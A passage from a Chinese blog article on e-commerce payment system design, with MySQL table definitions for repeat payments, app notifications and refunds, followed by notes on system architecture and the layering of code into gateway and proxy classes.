  <span class="string">`app_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'应用的id'</span>,
  <span class="string">`transaction_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'系统唯一识别交易号'</span>,
  <span class="string">`transaction_code`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支付成功时，该笔交易的 code'</span>,
  <span class="string">`trade_no`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'第三方对应的交易号'</span>,
  <span class="string">`pay_method_id`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'支付方式'</span>,
  <span class="string">`total_fee`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'交易金额'</span>,
  <span class="string">`scale`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'小数位数'</span>,
  <span class="string">`currency_code`</span> <span class="built_in">CHAR</span>(<span class="number">3</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'CNY'</span> <span class="keyword">COMMENT</span> <span class="string">'支付选择的币种，CNY、HKD、USD等'</span>,
  <span class="string">`payment_time`</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'第三方交易时间'</span>,
  <span class="string">`repeat_type`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">1</span> <span class="keyword">COMMENT</span> <span class="string">'重复类型：1同渠道支付、2不同渠道支付'</span>,
  <span class="string">`repeat_status`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'处理状态,0:未处理；1:已处理'</span>,
  <span class="string">`create_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,
  <span class="string">`update_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,
  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),
  <span class="keyword">INDEX</span> <span class="string">`idx_trad`</span> ( <span class="string">`transaction_id`</span>),
  <span class="keyword">INDEX</span> <span class="string">`idx_method`</span> (<span class="string">`pay_method_id`</span>),
  <span class="keyword">INDEX</span> <span class="string">`idx_time`</span> (<span class="string">`create_at`</span>)),
<span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span>
<span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8mb4
<span class="keyword">COMMENT</span> = <span class="string">'记录重复支付'</span>;


<span class="comment">-- -----------------------------------------------------</span>
<span class="comment">-- Table 通知上游应用日志</span>
<span class="comment">-- -----------------------------------------------------</span>
<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`pay_notify_app_log`</span> (
  <span class="string">`id`</span> <span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,
  <span class="string">`app_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'应用id'</span>,
  <span class="string">`pay_method_id`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'支付方式'</span>,
  <span class="string">`transaction_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'交易号'</span>,
  <span class="string">`transaction_code`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支付成功时，该笔交易的 code'</span>,
  <span class="string">`sign_type`</span> <span class="built_in">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'RSA'</span> <span class="keyword">COMMENT</span> <span class="string">'采用的签名方式：MD5 RSA RSA2 HASH-MAC等'</span>,
  <span class="string">`input_charset`</span> <span class="built_in">CHAR</span>(<span class="number">5</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'UTF-8'</span>,
  <span class="string">`total_fee`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'涉及的金额，无小数'</span>,
  <span class="string">`scale`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'小数位数'</span>,
  <span class="string">`pay_channel`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支付渠道'</span>,
  <span class="string">`trade_no`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'第三方交易号'</span>,
  <span class="string">`payment_time`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'支付时间'</span>,
  <span class="string">`notify_type`</span> <span class="built_in">VARCHAR</span>(<span class="number">10</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'paid'</span> <span class="keyword">COMMENT</span> <span class="string">'通知类型，paid/refund/canceled'</span>,
  <span class="string">`notify_status`</span> <span class="built_in">VARCHAR</span>(<span class="number">7</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'INIT'</span> <span class="keyword">COMMENT</span> <span class="string">'通知支付调用方结果；INIT:初始化，PENDING: 进行中；  SUCCESS：成功；  FAILED：失败'</span>,
  <span class="string">`create_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,
  <span class="string">`update_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,
  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),
  <span class="keyword">INDEX</span> <span class="string">`idx_trad`</span> (<span class="string">`transaction_id`</span>),
  <span class="keyword">INDEX</span> <span class="string">`idx_app`</span> (<span class="string">`app_id`</span>, <span class="string">`notify_status`</span>)
  <span class="keyword">INDEX</span> <span class="string">`idx_time`</span> (<span class="string">`create_at`</span>)),
<span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span>
<span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8mb4
<span class="keyword">COMMENT</span> = <span class="string">'支付调用方记录'</span>;


<span class="comment">-- -----------------------------------------------------</span>
<span class="comment">-- Table 退款</span>
<span class="comment">-- -----------------------------------------------------</span>
<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="string">`pay_refund`</span> (
  <span class="string">`id`</span> <span class="built_in">BIGINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,
  <span class="string">`app_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'应用id'</span>,
  <span class="string">`app_refund_no`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'上游的退款id'</span>,
  <span class="string">`transaction_id`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'交易号'</span>,
  <span class="string">`trade_no`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'第三方交易号'</span>,
  <span class="string">`refund_no`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'支付平台生成的唯一退款单号'</span>,
  <span class="string">`pay_method_id`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'支付方式'</span>,
  <span class="string">`pay_channel`</span> <span class="built_in">VARCHAR</span>(<span class="number">64</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'选择的支付渠道，比如：支付宝中的花呗、信用卡等'</span>,
  <span class="string">`refund_fee`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'退款金额'</span>,
  <span class="string">`scale`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'小数位数'</span>,
  <span class="string">`refund_reason`</span> <span class="built_in">VARCHAR</span>(<span class="number">128</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'退款理由'</span>,
  <span class="string">`currency_code`</span> <span class="built_in">CHAR</span>(<span class="number">3</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'CNY'</span> <span class="keyword">COMMENT</span> <span class="string">'币种，CNY  USD HKD'</span>,
  <span class="string">`refund_type`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'退款类型；0:业务退款; 1:重复退款'</span>,
  <span class="string">`refund_method`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">1</span> <span class="keyword">COMMENT</span> <span class="string">'退款方式：1自动原路返回; 2人工打款'</span>,
  <span class="string">`refund_status`</span> <span class="built_in">TINYINT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'0未退款; 1退款处理中; 2退款成功; 3退款不成功'</span>,
  <span class="string">`create_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,
  <span class="string">`update_at`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,
  <span class="string">`create_ip`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'请求源ip'</span>,
  <span class="string">`update_ip`</span> <span class="built_in">INT</span> <span class="keyword">UNSIGNED</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span> <span class="keyword">COMMENT</span> <span class="string">'请求源ip'</span>,
  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),
  <span class="keyword">UNIQUE</span> <span class="keyword">INDEX</span> <span class="string">`uniq_refno`</span> (<span class="string">`refund_no`</span>),
  <span class="keyword">INDEX</span> <span class="string">`idx_trad`</span> (<span class="string">`transaction_id`</span>),
  <span class="keyword">INDEX</span> <span class="string">`idx_status`</span> (<span class="string">`refund_status`</span>),
  <span class="keyword">INDEX</span> <span class="string">`idx_ctime`</span> (<span class="string">`create_at`</span>)),
<span class="keyword">ENGINE</span> = <span class="keyword">InnoDB</span>
<span class="keyword">DEFAULT</span> <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> = utf8mb4
<span class="keyword">COMMENT</span> = <span class="string">'退款记录'</span>;</code></pre>
<p>表的使用逻辑进行下方简单描述：</p>
<p><strong>支付</strong>，首先需要记录请求日志到 <code>pay_log_data</code>中，然后生成交易数据记录到 <code>pay_transaction</code>与<code>pay_transaction_extension</code> 中。</p>
<p><strong>收到通知</strong>，记录数据到 <code>pay_log_data</code> 中，然后根据时支付的通知还是退款的通知，更新 <code>pay_transaction</code> 与 <code>pay_refund</code> 的状态。如果是重复支付需要记录数据到 <code>pay_repeat_transaction</code> 中。并且将需要通知应用的数据记录到 <code>pay_notify_app_log</code>，这张表相当于一个消息表，会有消费者会去消费其中的内容。</p>
<p><strong>退款</strong> 记录日志日志到 <code>pay_log_data</code> 中，然后记录数据到退款表中 <code>pay_refund</code>。</p>
<p>当然这其中还有些细节，需要大家自己看了表结构，实际去思考一下该如何使用。如果有任何疑问欢迎到我们GitHub的项目（点击阅读原文）中留言，我们都会一一解答。</p>
<blockquote>
<p>这些表能够满足最基本的需求，其它内容可根据自己的需求进行扩张，比如：支持用户卡列表、退款走银行卡等。</p>
</blockquote>
<h3 id="系统设计"><a href="#系统设计" class="headerlink" title="系统设计"></a>系统设计</h3><p>这部分主要说下系统该如何搭建，以及代码组织方式的建议。</p>
<h4 id="系统架构-1"><a href="#系统架构-1" class="headerlink" title="系统架构"></a>系统架构</h4><p>由于支付系统的安全性非常高，因此不建议将对应的入口直接暴露给用户可见。应该是在自己的应用系统中调用支付系统的接口来完成业务。另外系统对数据要求是：强一致性的。因此也没有缓存介入（当如缓存可以用来做报警，这不在本文范畴）。</p>
<p><img src="/articles/电商设计手册/image-20190309135800643.png" alt></p>
<p>具体的实现，系统会使用两个域名，一个为内部使用，只有指定来源的ip能够访问固定功能（访问除通知外的其它功能）。另一个域名只能访问 <code>notify</code> <code>return</code> 两个路由。通过这种方式可以保证系统的安全。</p>
<p>在数据库的使用上无论什么请求直接走 <strong>Master</strong> 库。这样保证数据的强一致。当然从库也是需要的。比如：账单、对账相关逻辑我们可以利用从库完成。</p>
<h4 id="代码设计"><a href="#代码设计" class="headerlink" title="代码设计"></a>代码设计</h4><p>不管想做什么最终都要用代码来实现。我们都知道需要可维护、可扩展的代码。那么具体到支付系统你会怎么做呢？我已支付为例说下我的代码结构设计思路。仅供参考。比如我要介入：微信、支付宝、招行 三家支付。我的代码结构图如下：</p>
<p><img src="/articles/电商设计手册/image-20190309142925499.png" alt></p>
<p>用文字简单介绍下。我会将每一个第三方封装成： <code>XXXGateway</code> 类，内部是单纯的封装第三方接口，不管对方是 HTTP 请求还是 SOAP 请求，都在内部进行统一处理。</p>
<p>另外有一层<code>XXXProxy</code> 来封装这些第三方提供的能力。这一层主要干两件事情：对传过来请求支付的数据进行个性化处理。对返回的结构进行统一处理返回上层统一的结构。当然根据特殊情况这里可以进行一切业务处理；</p>
<p>通过上面的操作变化已经基本上被完全封装了。如果新增一个支付渠道。只需要增加：<code>XXXGateway</code> 与 <code>XXXProxy</code>。</p>
<p>那么 <code>Context</code> 与 <code>Server</code> 有什么用呢？<code>Server</code> 内部封装了所有的业务逻辑，它提供接口给 action 或者其它 server 进行调用。而 <code>Context</code> 这一层存在的价值是处理 <code>Proxy</code> 层返回的错误。以及在这里进行报警相关的处理。</p>
<p>上面的结构只是我的一个实践，欢迎大家讨论。</p>
<p>本文描述的系统只是满足了最基本的支付需求。缺少相关的监控、报警。如果你按照上文设计自己的系统，风险自担与我无关。</p>
<h1 id="订单中心"><a href="#订单中心" class="headerlink" title="订单中心"></a>订单中心</h1><p>请您耐心等待…</p>
<h1 id="仓储系统"><a href="#仓储系统" class="headerlink" title="仓储系统"></a>仓储系统</h1><p>请您耐心等待…</p>
<h1 id="物流系统"><a href="#物流系统" class="headerlink" title="物流系统"></a>物流系统</h1><p>请您耐心等待…</p>
<h1 id="售后服务"><a href="#售后服务" class="headerlink" title="售后服务"></a>售后服务</h1><p>请您耐心等待…</p>
<h1 id="基础服务"><a href="#基础服务" class="headerlink" title="基础服务"></a>基础服务</h1><p>请您耐心等待…</p>
<style>.posts-expand .post-body img{margin:0 auto; max-height:100vh;}</style>

]]></content>
      <categories>
        <category>架构设计</category>
      </categories>
  </entry>
</search>
